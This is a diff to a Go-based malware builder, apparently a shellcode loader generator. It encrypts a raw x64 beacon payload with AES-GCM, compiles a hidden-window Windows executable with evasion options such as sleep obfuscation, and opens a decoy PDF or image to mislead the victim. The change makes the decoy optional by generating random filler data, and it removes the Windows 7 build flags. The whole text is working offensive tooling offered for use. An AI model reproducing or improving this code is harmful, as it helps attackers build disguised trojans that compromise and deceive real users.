@@ -7,6 +7,7 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
+	"encoding/binary"
 	"flag"
 	"fmt"
 	"io"
@@ -63,6 +64,7 @@ const (
 	aesSaltBase64            = "{{.Salt}}"
 	decoyFileName            = "{{.DecoyFileName}}"
 	enableCompress           = {{.EnableCompress}}
+	hasRealDecoy           = {{.HasRealDecoy}}
 )
 
 var (
@@ -1451,20 +1453,21 @@ func main() {
 		} else {
 			decoyPath = filepath.Join("C:\\Temp", decoyFileName)
 		}
-		
-		if writeErr := os.WriteFile(decoyPath, decoyBytes, 0644); writeErr == nil {
-			// 使用ShellExecute打开文件
-			shell32 := getShell32()
-			shellExecuteA := getProcAddr(shell32, "ShellExecuteA")
-			
-			if shellExecuteA != 0 {
-				verb, _ := syscall.BytePtrFromString("open")
-				path, _ := syscall.BytePtrFromString(decoyPath)
-				syscall.Syscall6(shellExecuteA, 6, 0,
-					uintptr(unsafe.Pointer(verb)),
-					uintptr(unsafe.Pointer(path)),
-					0, 0, 1) // SW_SHOWNORMAL
-			}
+		if  hasRealDecoy {
+			if writeErr := os.WriteFile(decoyPath, decoyBytes, 0644); writeErr == nil {
+				// 使用ShellExecute打开文件
+				shell32 := getShell32()
+				shellExecuteA := getProcAddr(shell32, "ShellExecuteA")
+				
+				if shellExecuteA != 0 {
+					verb, _ := syscall.BytePtrFromString("open")
+					path, _ := syscall.BytePtrFromString(decoyPath)
+					syscall.Syscall6(shellExecuteA, 6, 0,
+						uintptr(unsafe.Pointer(verb)),
+						uintptr(unsafe.Pointer(path)),
+						0, 0, 1) // SW_SHOWNORMAL
+				}
+			} 
 		}
 	}
 	
@@ -1524,6 +1527,7 @@ type TemplateData struct {
 	EnableMutate     bool
 	EnableCompress   bool
 	DelaySeconds     int
+	HasRealDecoy bool
 }
 
 func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
@@ -1569,7 +1573,7 @@ func main() {
 	log.SetFlags(0)
 
 	// 定义所有标志
-	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
+	decoyFile := flag.String("decoy", "", "Optional: Path to a decoy file (pdf/doc/jpg); or omit to use internal random data (no file opened).")
 	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
 	outputFile := flag.String("out", "", "Required: Final output executable name.")
 	enableObfuscate := flag.Bool("obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
@@ -1605,11 +1609,8 @@ func main() {
 	log.Println(logo)
 	flag.Parse()
 
-	if *decoyFile == "" || *payloadFile == "" || *outputFile == "" {
+	if *payloadFile == "" || *outputFile == "" {
 		fmt.Fprintf(os.Stderr, "\n❌ Error: Missing required parameters!\n\n")
-		if *decoyFile == "" {
-			fmt.Fprintf(os.Stderr, "Missing -decoy: Please specify a decoy file path\n")
-		}
 		if *payloadFile == "" {
 			fmt.Fprintf(os.Stderr, "Missing -payload: Please specify a shellcode file path\n")
 		}
@@ -1619,11 +1620,34 @@ func main() {
 		fmt.Fprintf(os.Stderr, "\nUse '%s -h' for help.\n\n", os.Args[0])
 		os.Exit(1)
 	}
+	var decoyBytes []byte
+	var hasRealDecoy bool
 
-	decoyBytes, err := os.ReadFile(*decoyFile)
-	if err != nil {
-		log.Fatalf("[-] Failed to read decoy file: %v", err)
+	if *decoyFile == "" {
+		// 生成随机数
+		var n uint32
+		binary.Read(rand.Reader, binary.LittleEndian, &n)
+		randLen := 5*1024 + int(n)%(25*1024)
+
+		data := make([]byte, randLen)
+		const ascii = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\r\n "
+		for i := range data {
+			var b [1]byte
+			rand.Read(b[:])
+			data[i] = ascii[int(b[0])%len(ascii)]
+		}
+		decoyBytes = data
+		hasRealDecoy = false
+	} else {
+		// 用户传了真实文件
+		var err error
+		decoyBytes, err = os.ReadFile(*decoyFile)
+		if err != nil {
+			log.Fatalf("[-] Failed to read decoy file: %v", err)
+		}
+		hasRealDecoy = true
 	}
+
 	shellcodeBytes, err := os.ReadFile(*payloadFile)
 	if err != nil {
 		log.Fatalf("[-] Failed to read payload file: %v", err)
@@ -1656,6 +1680,7 @@ func main() {
 		EnableMutate:     *enableMutate,
 		EnableCompress:   *enableCompress,
 		DelaySeconds:     *delaySeconds,
+		HasRealDecoy: hasRealDecoy,
 	}
 
 	log.Println("[+] Generating loader source code...")
@@ -1729,7 +1754,7 @@ require golang.org/x/sys v0.31.0 // indirect
 	if len(features) > 0 {
 		log.Printf("[+] Enabled evasion features: %v", features)
 	}
-	ldflags := "-s -w -H windowsgui -extldflags=/SUBSYSTEM:WINDOWS,5.02"
+	ldflags := "-s -w -H windowsgui"
 	// 使用绝对路径作为输出文件
 	absOutputFile, err := filepath.Abs(*outputFile)
 	if err != nil {
@@ -1748,7 +1773,7 @@ require golang.org/x/sys v0.31.0 // indirect
 	log.Printf("[+] Building x64 version...")
 	output64 := absOutputFile
 	log.Printf("[+] x64 ldflags: %v", ldflags)
-	cmd64 := exec.Command("go", "build", "-tags", "win7", "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
+	cmd64 := exec.Command("go", "build",  "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
 	cmd64.Dir = tmpDir
 
 	env64 := os.Environ()
